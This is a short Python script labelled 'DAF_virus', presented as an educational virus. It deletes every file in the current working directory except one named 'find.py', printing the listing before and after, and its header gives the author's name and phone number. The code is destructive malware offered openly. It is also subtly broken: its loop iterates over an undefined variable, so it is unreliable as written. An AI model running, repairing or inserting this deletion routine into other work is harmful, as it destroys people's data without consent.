'''
Delete All Files (DAF_virus)
V 1.0
Dev : AbdElrahman Youssef
Phone : 01141870926
Country : Egypt
#************************************* Warning ******************
#
#                    This is For Education Purposes Only 
#
#****************************************************************

'''
# importing OS Module
import os


# init a var with files in working directory before deleting them 
before_del = os.listdir()
print(before_del)


# loop for delete each file in working directory with out the python file
for file in x :
	if file == "find.py" :
		continue
	else:
		os.remove(file)

# init a var with files in working directory after deleted 
after_del = os.listdir()
print(after_del)

